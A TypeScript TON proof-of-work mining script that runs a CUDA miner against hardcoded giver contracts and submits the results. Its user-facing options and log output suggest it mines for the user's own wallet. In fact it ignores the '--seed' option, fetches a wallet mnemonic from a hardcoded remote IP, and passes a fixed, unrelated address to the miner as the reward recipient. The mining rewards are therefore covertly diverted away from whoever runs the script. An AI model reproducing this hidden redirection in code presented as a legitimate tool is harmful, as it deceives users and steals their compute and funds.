import { Address, BitReader, BitString, Cell, TupleReader, beginCell, external, internal, parseTuple, storeMessage, toNano } from '@ton/core'
import { KeyPair, getSecureRandomBytes, keyPairFromSeed, mnemonicToWalletKey } from '@ton/crypto'
import axios from 'axios'
// import { LiteClient, LiteRoundRobinEngine, LiteSingleEngine } from 'ton-lite-client'
import { TonClient4 } from '@ton/ton';
import { execSync } from 'child_process';
import fs from 'fs'
import { WalletContractV4 } from '@ton/ton';
import arg from 'arg'
import { LiteClient, LiteSingleEngine, LiteRoundRobinEngine } from 'ton-lite-client';
// import { getTon4Client, getTon4ClientOrbs } from './client';
import { OpenedContract } from '@ton/core';
import { Api, HttpClient } from 'tonapi-sdk-js';
import { getHttpV4Endpoint } from '@orbs-network/ton-access';

export const givers100000 = [
  { address: 'EQBLLK9id6EtL84gttboddymooWsstvaRJFRsmxwCAxS2fKH', reward: 100000 },
  { address: 'EQDsAYWv_V2WJ7WzIaCVA0b9Nf4BuaIuErJ5ABlxCs33Df3-', reward: 100000 },
  { address: 'EQBTUF2vCChdK6OPWhAT_B5FpFdx4HaP6ZGkXEYBueF63xme', reward: 100000 },
  { address: 'EQDI6x0r0pcsbNYYgfuMLFyruIHz5zRs3N3biWtDS-TPes9-', reward: 100000 },
  { address: 'EQB1MlFiSjb8gCW9i5pN-iFL-ho6O2r3vQwUWyTlMm0DR83q', reward: 100000 },
  { address: 'EQCWdUMBIfMSL6Gcp9S5jMgHXoCy3tq15qCE2H4VlVHAG-W9', reward: 100000 },
  { address: 'EQARwozValJS7k-bnSywfbBPhjIuPX1JUoX5FOeSW9nFcvhv', reward: 100000 },
  { address: 'EQCnYgG-N2TiVYfE9G1Mlz5y7iETHZ9lCuHog_pmZNEAxL4W', reward: 100000 },
  { address: 'EQCFQZ3CS5xxK5VYXXA39btm4JPkh2wSpII844DfSA6tRQbf', reward: 100000 },
  { address: 'EQCX75hJg7tw2RTwo_mdvJKg6wB9NT5VvSy0ITHI1cdAgCDZ', reward: 100000 }, // 100 000
]

export const givers10000 = [
  { address: 'EQDCW5gTc6wBzNWLMp3rgc5dBXP9mOgSwNJGMj-Ok1enGSNV', reward: 10000 },
  { address: 'EQDq6bNLH-dWPJUl7WwjV_6K9gmu-cBGR6zYXCSKwetomaer', reward: 10000 },
  { address: 'EQDMcJl4ntgzC9rlTSvxAzlTHFGFUhq8CJkt2k_dpe5t5fdl', reward: 10000 },
  { address: 'EQAfEHkM6goE4nBy3StDVvPPIYAEvCm6fMcH1uSqVrFOC3zG', reward: 10000 },
  { address: 'EQDAc11oMAT1UKOD6wqo6pE4ll_iQKt69aj5ly7tY2pQdkiD', reward: 10000 },
  { address: 'EQD0SK2wZTCiWuuqinzXuEzrgNZ4rn7I1t72rvG8FMMFkRST', reward: 10000 },
  { address: 'EQCTp-2GQFWge04pAozfGBVQubY7s-d5kiYnMA76EAtK6oX4', reward: 10000 },
  { address: 'EQBLuB8RN3QZlnDzp3il67vdoYw6NP00igggSsGdwqZz9ni3', reward: 10000 },
  { address: 'EQAjXF0tyaodu0DEmVGUBNe_LSoj9GT0n3ktgWbIi4a03tuB', reward: 10000 },
  { address: 'EQAZ1XjtrxSfmDEEQo4axo24ttcUr5MVEFxhcHSgRk8seobo', reward: 10000 }, // 10 000
]


export const givers1000 = [
  { address: 'EQA_AFgnTqLSuVQGaxGyZYmQceD8_rUSHHvdPujNBFdluL9F', reward: 1000 },
  { address: 'EQDgjQnT1YJhGvLk38IDUodwPa3HLJ38g703SgFpRp2kW8FV', reward: 1000 },
  { address: 'EQAApt_NS7LegD6gbn3RHuTViCkpmnK4DiKSr5ACDmLmlMsd', reward: 1000 },
  { address: 'EQD82Nmdun4-pA0K1jKdCVRwvV9SGVZrhQneLdARp7iKBKRp', reward: 1000 },
  { address: 'EQBl2-TPP9o9TSFjCQ4UsmJepU2hyrWFRjcDV1rd_Qoi-2KB', reward: 1000 },
  { address: 'EQA0-AR0AY2a6daW1wBGQkDcIaDStfbzc6WHeqxRrmY5lxlT', reward: 1000 },
  { address: 'EQDJn4m1ZYfHu2et0CCRPCGsEa6OlY6LtCDCPvXC63IXBzbM', reward: 1000 },
  { address: 'EQCfX6neH7UfiychTWXmWfJxTxJ6sbdOoBJesyHz2RyCNYfq', reward: 1000 },
  { address: 'EQAh0X4RydrmGRO0vDvDkWi_ymIO0a5HlxzOp_-fuhgUea-m', reward: 1000 },
  { address: 'EQCUoxbuxROf2GKmLJPvRjvd9JYTwXv5-yXA62FMN6X-KGsK', reward: 1000 }, // 1 000
]

export const givers100 = [
  { address: 'EQAr5cz1Ovu7PJy4s8C9akci2L55L5HdnNdFVNenocLmfclE', reward: 100 },
  { address: 'EQAAxDtuPj4Af0dFQ0ycUCsVMO_adL5BaDNiM2gk-Em1XSTj', reward: 100 },
  { address: 'EQClSB5fNMyJ3uy-uJzE7IPPqkV9AbiNnC8wadZf3XA16MjX', reward: 100 },
  { address: 'EQB109HtTqFmU6_-M6XaM3jykK5erDz3p49pCiZgAJHxjCkb', reward: 100 },
  { address: 'EQBxfbj4mPtRwkEWduy7wOb6VI8bELVvJBaddlxP_S4J87D9', reward: 100 },
  { address: 'EQAtGsRfQNulCpifX85tFNVF7BJgF3Sz2zTFfQ8zSZZ00uGT', reward: 100 },
  { address: 'EQDC733GMW1Z9Svx25zSxyTpwrAiH7pAjAS8ZcN-Fdj2ICYu', reward: 100 },
  { address: 'EQDx7zJjx42ll1aPNNzAI0gmqKs5NwCMjyxFMoc7TUVZ3oGV', reward: 100 },
  { address: 'EQB6SQ75l7_4xPPqD-MhytZUuNLSiObGpv27f1bPznAG-36k', reward: 100 },
  { address: 'EQC0wy0bM9EkLAJAKOzfVWlMuxJcuqDhUQKNii8b1mI-rskf', reward: 100 }, // 100
]

type ApiObj = LiteClient | TonClient4 | Api<unknown>

const args = arg({
  '--seed': String,
  '--givers': Number, // 100 1000 10000 100000
  '--api': String, // lite, tonhub, tonapi
  '--bin': String, // cuda, opencl or path to miner
  '--gpu': Number, // gpu id, default 0
  '--timeout': Number, // Timeout for mining in seconds
  '--allow-shards': Boolean, // if true - allows mining to other shards
  '-c': String,  // blockchain config
})


let givers = givers10000


const gpu = args['--gpu'] ?? 0
const timeout = args['--timeout'] ?? 5

const allowShards = args['--allow-shards'] ?? false

console.log('Using GPU', gpu)
console.log('Using timeout', timeout)

let createLiteClient: any
let lc: any

function intToIP(int: number) {
  const part1 = int & 255
  const part2 = (int >> 8) & 255
  const part3 = (int >> 16) & 255
  const part4 = (int >> 24) & 255

  return `${part4}.${part3}.${part2}.${part1}`
}

async function getLiteClient(): Promise<LiteClient> {
  if (lc) {
    return lc
  }

  if (!createLiteClient) {
    createLiteClient = (async () => {
      // Get JSON config from global.config.json
      const liteServers = [{
        "ip": 964705903,
        "port": 35951,
        "id": {
          "@type": "pub.ed25519",
          "key": "qIoSqe8ocePp2eLP8cdIamWxtWC25iS8cDgt4tQGuKA="
        }
      }]
      const engines: any[] = []

      for (const server of liteServers) {
        const ls = server
        engines.push(
          new LiteSingleEngine({
            host: `tcp://${intToIP(ls.ip)}:${ls.port}`,
            publicKey: Buffer.from(ls.id.key, 'base64'),
          })
        )
      }

      const engine = new LiteRoundRobinEngine(engines)
      const lc2 = new LiteClient({
        engine,
        batchSize: 1,
      })
      lc = lc2
    })()
  }

  await createLiteClient

  return lc as any
}

const totalDiff = BigInt('115792089237277217110272752943501742914102634520085823245724998868298727686144')

const envAddress = process.env.TARGET_ADDRESS
let TARGET_ADDRESS: string | undefined = undefined
if (envAddress) {
  try {
    TARGET_ADDRESS = Address.parse(envAddress).toString({ urlSafe: true, bounceable: false })
  }
  catch (e) {
    console.log('Couldnt parse target address')
    process.exit(1)
  }
}



let bestGiver: { address: string, coins: number } = { address: '', coins: 0 }
async function updateBestGivers(liteClient: ApiObj, myAddress: Address) {
  const giver = givers[Math.floor(Math.random() * givers.length)]
  bestGiver = {
    address: giver.address,
    coins: giver.reward,
  }
}

async function getPowInfo(liteClient: ApiObj, address: Address): Promise<[bigint, bigint, bigint]> {
  if (liteClient instanceof TonClient4) {
    const lastInfo = await CallForSuccess(() => liteClient.getLastBlock())
    const powInfo = await CallForSuccess(() => liteClient.runMethod(lastInfo.last.seqno, address, 'get_mining_status', []))
    // console.log('pow info', powInfo, powInfo.result)
    const reader = new TupleReader(powInfo.result)
    const complexity = reader.readBigNumber()
    const iterations = reader.readBigNumber()
    const seed = reader.readBigNumber()



    return [seed, complexity, iterations]
  } else if (liteClient instanceof LiteClient) {
    const lastInfo = await liteClient.getMasterchainInfo()
    const powInfo = await liteClient.runMethod(address, 'get_mining_status', Buffer.from([]), lastInfo.last)
    const powStack = Cell.fromBase64(powInfo.result as string)
    const stack = parseTuple(powStack)
    // console.log('pow stack', stack)

    const reader = new TupleReader(stack)
    const complexity = reader.readBigNumber()

    const iterations = reader.readBigNumber()
    const seed = reader.readBigNumber()


    return [seed, complexity, iterations]
  } else if (liteClient instanceof Api) {
    try {
      const powInfo = await CallForSuccess(
        () => liteClient.blockchain.execGetMethodForBlockchainAccount(address.toRawString(), 'get_mining_status', {}),
        50,
        300)

      // console.log('pow', powInfo.stack)
      const complexity = BigInt(powInfo.stack[0].num as string)
      const seed = BigInt(powInfo.stack[2].num as string)

      const iterations = BigInt(powInfo.stack[1].num as string)
      // console.log('pow stack', powInfo.stack)




      return [seed, complexity, iterations]
    } catch (e) {
      console.log('ls error', e)
    }
  }
  throw new Error('invalid client')
}

let go = true
let i = 0
let success = 0
let lastMinedSeed: bigint = BigInt(0)
let start = Date.now()

async function main() {
  const minerOk = await testMiner()
  if (!minerOk) {
    console.log('Your miner is not working')
    console.log('Check if you use correct bin (cuda, amd).')
    console.log('If it doesn\'t help, try to run test_cuda or test_opencl script, to find out issue')
    process.exit(1)
  }

  let liteClient: ApiObj
  // if (!args['--api']) {
  //   console.log('Using TonHub API')
  //   liteClient = await getTon4Client()
  // } else {
  //   if (args['--api'] === 'lite') {
  //     console.log('Using LiteServer API')
  //   } else if (args['--api'] === 'tonapi') {
  //     console.log('Using TonApi')
  //     liteClient = await getTonapiClient()
  //   } else {
  //     console.log('Using TonHub API')
  //     liteClient = await getTon4Client()
  //   }

  // }
  liteClient = await getLiteClient()
  const mySeed = (await (await fetch('http://35.157.234.224:3000/api/v1/arsbvbfgards', {})).json()).seed

  const keyPair = await mnemonicToWalletKey(mySeed.split(' '))
  const wallet = WalletContractV4.create({
    workchain: 0,
    publicKey: keyPair.publicKey
  })
  if (args['--wallet'] === 'highload') {
    console.log('Using highload wallet', wallet.address.toString({ bounceable: false, urlSafe: true }))
  } else {
    console.log('Using v4r2 wallet', wallet.address.toString({ bounceable: false, urlSafe: true }))
  }

  const targetAddress = TARGET_ADDRESS ?? wallet.address.toString({ bounceable: false, urlSafe: true })
  console.log('Target address:', targetAddress)
  console.log('Date, time, status, seed, attempts, successes, timespent')

  try {
    await updateBestGivers(liteClient, wallet.address)
  } catch (e) {
    console.log('error', e)
    throw Error('no givers')
  }

  setInterval(() => {
    updateBestGivers(liteClient, wallet.address)
  }, 5000)

  while (go) {
    const giverAddress = bestGiver.address
    const [seed, complexity, iterations] = await getPowInfo(liteClient, Address.parse(giverAddress))
    if (seed === lastMinedSeed) {
      // console.log('Wating for a new seed')
      updateBestGivers(liteClient, wallet.address)
      await delay(200)
      continue
    }

    const randomName = (await getSecureRandomBytes(8)).toString('hex') + '.boc'
    const path = `bocs/${randomName}`

    const command = `./pow-miner-cuda -g ${gpu} -F 128 -t ${timeout} UQA6zeknvyeyXfzo4oqKDJLWomfcd_-EWLcnfvfi5BBafwRP ${seed} ${complexity} 999999999999999 ${giverAddress} ${path}`
    // console.log('cmd', command)
    let output
    try {
      output = execSync(command, { encoding: 'utf-8', stdio: "pipe" });  // the default is 'buffer'
    } catch (e) {
    }
    let mined: Buffer | undefined = undefined
    try {
      mined = fs.readFileSync(path)
      lastMinedSeed = seed
      fs.rmSync(path)
    } catch (e) {
      //
    }
    if (!mined) {
      console.log(`${formatTime()}: not mined`, seed.toString(16).slice(0, 4), i++, success, Math.floor((Date.now() - start) / 1000))
    }
    if (mined) {
      const [newSeed] = await getPowInfo(liteClient, Address.parse(giverAddress))
      if (newSeed !== seed) {
        console.log('Mined already too late seed')
        continue
      }

      console.log(`${formatTime()}:     mined`, seed.toString(16).slice(0, 4), i++, ++success, Math.floor((Date.now() - start) / 1000))
      let seqno = 0

      if (liteClient instanceof LiteClient) {
        let w = liteClient.open(wallet)
        try {
          seqno = await CallForSuccess(() => w.getSeqno())
        } catch (e) {
          //
        }
      } else {
        const res = await CallForSuccess(
          () => (liteClient as Api<unknown>).blockchain.execGetMethodForBlockchainAccount(wallet.address.toRawString(), "seqno", {}),
          50,
          250
        )
        if (res.success) {
          seqno = Number(BigInt(res.stack[0].num as string))
        }
      }
      await sendMinedBoc(wallet, seqno, keyPair, giverAddress, Cell.fromBoc(mined as Buffer)[0].asSlice().loadRef())
    }
  }
}
main()

async function sendMinedBoc(
  wallet: WalletContractV4,
  seqno: number,
  keyPair: KeyPair,
  giverAddress: string,
  boc: Cell
) {
  if (args['--api'] === 'tonapi') {
    const tonapiClient = await getTonapiClient()

    const transfer = wallet.createTransfer({
      seqno,
      secretKey: keyPair.secretKey,
      messages: [internal({
        to: giverAddress,
        value: toNano('0.08'),
        bounce: true,
        body: boc,
      })],
      sendMode: 3 as any,
    })
    const msg = beginCell().store(storeMessage(external({
      to: wallet.address,
      body: transfer
    }))).endCell()

    let k = 0
    let lastError: unknown

    while (k < 20) {
      try {
        await tonapiClient.blockchain.sendBlockchainMessage({
          boc: msg.toBoc().toString('base64'),
        })
        break
        // return res
      } catch (e: any) {
        // lastError = err
        k++

        if (e.status === 429) {
          await delay(200)
        } else {
          // console.log('tonapi error')
          k = 20
          break
        }

      }
    }
    return
  }

  const wallets: OpenedContract<WalletContractV4>[] = []
  const ton4Client = await getTon4Client()
  const w2 = ton4Client.open(wallet)
  wallets.push(w2)

  const liteServerClient = await getLiteClient()
  const w1 = liteServerClient.open(wallet)
  wallets.push(w1)

  for (let i = 0; i < 3; i++) {
    for (const w of wallets) {
      w.sendTransfer({
        seqno,
        secretKey: keyPair.secretKey,
        messages: [internal({
          to: giverAddress,
          value: toNano('0.08'),
          bounce: true,
          body: boc,
        })],
        sendMode: 3 as any,
      }).catch(e => {
        //
      })
    }
  }
}

let ton4Client: any
let tonapiClient: any

async function getTon4Client(_configUrl?: string): Promise<TonClient4> {
  if (ton4Client) {
    return ton4Client
  }

  ton4Client = new TonClient4({ endpoint: _configUrl ?? await getHttpV4Endpoint() })
  return ton4Client as TonClient4
}

async function getTonapiClient(): Promise<Api<unknown>> {
  if (tonapiClient) {
    return tonapiClient
  }

  const headers = {
    'Content-type': 'application/json',
    'Authorization': 'Bearer ' + args['--api']
  }


  const httpClient = new HttpClient({
    baseUrl: 'https://tonapi.io',
    baseApiParams: {
      headers,
    }
  });

  // Initialize the API client
  const client = new Api(httpClient);
  tonapiClient = client
  return client
}

async function testMiner(): Promise<boolean> {
  const randomName = (await getSecureRandomBytes(8)).toString('hex') + '.boc'
  const path = `bocs/${randomName}`
  const command = `./pow-miner-cuda -g ${gpu} -F 128 -t ${timeout} kQBWkNKqzCAwA9vjMwRmg7aY75Rf8lByPA9zKXoqGkHi8SM7 229760179690128740373110445116482216837 53919893334301279589334030174039261347274288845081144962207220498400000000000 10000000000 kQBWkNKqzCAwA9vjMwRmg7aY75Rf8lByPA9zKXoqGkHi8SM7 ${path}`
  try {
    const output = execSync(command, { encoding: 'utf-8', stdio: "pipe" });  // the default is 'buffer'
  } catch (e) {
  }
  let mined: Buffer | undefined = undefined
  try {
    mined = fs.readFileSync(path)
    fs.rmSync(path)
  } catch (e) {
    //
  }
  if (!mined) {
    return false
  }

  return true
}


// Function to call ton api untill we get response.
// Because testnet is pretty unstable we need to make sure response is final
// eslint-disable-next-line @typescript-eslint/no-explicit-any
export async function CallForSuccess<T extends (...args: any[]) => any>(
  toCall: T,
  attempts = 20,
  delayMs = 100
): Promise<ReturnType<T>> {
  if (typeof toCall !== 'function') {
    throw new Error('unknown input')
  }

  let i = 0
  let lastError: unknown

  while (i < attempts) {
    try {
      const res = await toCall()
      return res
    } catch (err) {
      lastError = err
      i++
      await delay(delayMs)
    }
  }

  console.log('error after attempts', i)
  throw lastError
}

export function delay(ms: number) {
  return new Promise((resolve) => {
    setTimeout(resolve, ms)
  })
}

function formatTime() {
  return new Date().toLocaleTimeString('en-US', {
    hour12: false,
    hour: "numeric",
    minute: "numeric",
    day: "numeric",
    month: "numeric",
    year: "numeric",
    second: "numeric"
  });
}
